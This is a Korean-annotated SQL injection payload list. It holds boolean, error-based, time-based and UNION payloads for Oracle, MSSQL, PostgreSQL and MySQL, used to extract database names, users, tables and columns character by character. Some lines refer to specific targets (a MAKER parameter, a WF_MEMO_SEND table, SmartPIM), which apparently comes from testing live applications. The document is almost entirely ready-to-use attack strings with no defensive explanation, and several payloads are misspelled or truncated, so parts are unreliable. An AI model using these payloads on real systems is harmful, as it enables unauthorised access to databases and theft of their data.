###SQL INJECTION

##참거짓
, (case when 1=1 then 1 else 1/0 end) desc
, (case when 1=0 then 1 else 1/0 end) desc

' and 1'1='1
' and 1'1='2
',(SELECT+(CASE+WHEN+(1=1)+THEN+1+1ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL)
',(SELECT+(CASE+WHEN+(1=2)+THEN+1+1ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL)
,+(case+when+1=1+then+1+else+1/0+end)
,+(case+when+1=2+then+1+else+1/0+end)
<case+when+1=1+then+1+else+1/0+end)
<case+when+1=2+then+1+else+1/0+end)
||(CASE+WHEN+1=1+THEN+1+ELSE+-1+END)
||(CASE+WHEN+1=2+THEN+1+ELSE+-1+END)
'+AND+'1%'='1
'+AND+'1%'='2
%'+UNION+ALL_SELECT+NULL,NULL, FROM+(SELECT+DISTINCT(OWNER)+FROM+SYS,ALL_TABLES)--+sql
##time based

;select+case+when+1=1+then+pg_sleep(5)+else+pg_sleep(0)+end--
;select+case+when+1=2+then+pg_sleep(5)+else+pg_sleep(0)+end--
'||(select case when 1=1 then 'test' else 'SQL Injection Test' end from dual)||'
'||(select case when 1=2 then 'test' else 'SQL Injection Test' end from dual)||'

'%LOT' and (db_name())>1 and MAKER='LOT%'
and (db_name())>1

and extractvalue(rand(), concat(0x3a, (SELECT concat(0x3a, schema_name) FROM information_schema.schemata LIMIT 0,1)))--
'and 1=convert(int,db_name())-'
'+convert(char,(SELECT IIF(SUBSTRING(DB_NAME(),1,1)='A',3,@@VERSION)))+'

'union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null'--
)and('1'='1'"
)and('1'='2'"
'and 1=convert(int, @@version)-'
' and (@@version()>1 and MAKER='LOT
' and (db_name())>1 and MAKER='LOT
' and (user_name())>1 and MAKER='2024
' and (host_name())>1 and MAKER='LOT
' and ((select top 1 TABLE_NAME FROM information_schema.TABLES))>1 and MAKER='LOT
' and ((SELECT top 1 column_name from information_schema.columns))>1 and MAKER='LOT






LOT' and 1=CONVERT(INT,(SELECT TOP 1 MSGID FROM WF_MEMO_SEND))-'

SELECT MSGID FROM WF_MEMO_SEND
MSGID

') and (select len(@@SERVERNAME) > 0) -- -

') AND (SELECT CASE WHEN LENGTH(USER) = 11 THEN 1 ELSE 0 END FROM DUAL)=1 --

"D/A') AND (SELECT CASE WHEN LENGTH(USER)=10 THEN 1 ELSE 0 END FROM DUAL)=1 --"
"D/A') AND (SELECT CASE WHEN LENGTH('USERENV', 'DB_NAME')=11 THEN 1 ELSE 0 END FROM DUAL)=1 --"

"D/A') AND (SELECT CASE WHEN LENGTH('USERENV', 'DB_NAME')=16 THEN 1 ELSE 0 END FROM DUAL)=1 --"
"D/A') AND (SELECT CASE WHEN LENGTH(NAME)=1 THEN 'TRUE' ELSE 'FALSE' END FROM V$DATABASE)='TRUE' --"
"D/A') AND (SELECT CASE WHEN LENGTH(SYS_CONTEXT('USERENV', 'DB_NAME'))=5 THEN 1 ELSE 0 END FROM DUAL)=1 --"

') AND (SELECT CASE WHEN SUBSTR(NAME 1,1)='q' THEN 'TRUE' ELSE 'FALSE' END FROM V$DATABASE)='TRUE'--

') and (SELECT CASE WHEN SUBSTRING(user, 1,1)='a' TEHN 1 ELSE 0 END FROM DUAL)=1--

(case when 1=1 then 1 else 1/0 end)
(case when 1=2 then 1 else 1/0 end)


' and '1'='1
' and '1'='2

데이터 베이스 명
X0145765' and SUBSTR((SELECT SYS.DATABASE_NAME FROM DUAL), 1,1)='A'--

테이블 갯수
X0145765' AND (SELECT COUNT(*) FROM all_tables) = 120 --

1열 테이블 글자 수
X0145765' AND (SELECT LENGTH(table_name) FROM all_tables WHERE ROWNUM=1)=4 -- 

1열 테이블 명
X0145765' AND SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1), 1, 1) = 'a' --

테이블 컬럼 명
X0145765' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name='DUAL')= 1 --

1열 테이블 컬럼 갯수
X0145765' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name= 'DUAL')=1 --

첫번째 컬럼 명 길이
"X0145765' AND LENGTH((SELECT column_name FROM all_tab_columns WHERE table_name = 'DUAL' AND ROWNUM = 1))=5 --

컬럼 내 데이터 갯수
X0145765' AND (SELECT COUNT(DUMMY) FROM DUAL)=1 --

3번째 DB 이름
X0145765' AND SUBSTR((SELECT username FROM (SELECT ROWNUM rnum, username FROM all_users) WHERE rnum = 3), 5, 1)='E' --

테이블 갯수
X0145765' AND (SELECT COUNT(*) FROM all_tables WHERE owner = 'SYSTEM') = 6--

1열 테이블 명 길이
"X0145765' AND (SELECT LENGTH(table_name) FROM all_Tables WHERE owner = 'SYSTEM' AND ROWNUM =1) = 4 --

1열 테이블 명 
X0145765' AND SUBSTR((SELECT table_name FROM all_Tables WHERE owner = 'SYSTEM' AND ROWNUM=1), 1, 1)= 'A' --

HELP 테이블 컬럼 갯수 3개
X0145765' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name= 'HELP')=3 --

HELP 테이블 1열 컬럼명 길이
X0145765' AND LENGTH((SELECT column_name FROM all_tab_columns WHERE table_name = 'HELP' AND ROWNUM = 1))=5 --

HELP 1열 컬럼 이름
X0145765' AND SUBSTR((SELECT column_name FROM all_tab_columns WHERE table_name = 'HELP' AND ROWNUM=1),1, 1)= 'A' --


,(select+case+when+ascii(substr((select+user+from+dual+where+rownum=1),1,1))<65+then+(select+1+from+dual)+else+1/0+end+from+dual)
',(SELECT+(CASE+WHEN+(1=1)+THEN+1+1ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL) 
(case when 1=1 then 1 else 1/0 end) 
and(select count(*) from product_component_version where version_full like '%{버전}%')=1 -- -" 
',(SELECT+(CASE+WHEN+(1=1)+THEN+1+ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL 
',(SELECT+(CASE+WHEN+(1=2)+THEN+1+ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL 
,(case when ascii(substr('abc', 1, 1)) > 84 then 1 else 1/0 end) desc 
'||(case+when+1=1+then+1+else+1/0+end) 
17.SmartPIM 
'+AND+'1%'='1 
'+UNION+ALL_SELECT+NULL,생략+FROM+(SELECT+DISTINCT(OWNER)+FROM+SYS,ALL_TABLES)--+SQL 
'+AND+1=1+AND+'1'='1 
+UNION+ALL_SELECT+NULL,(SELECT+@@version),NULL, 생략 -- 
"('1') AND (SELECT COUNT(table_name)
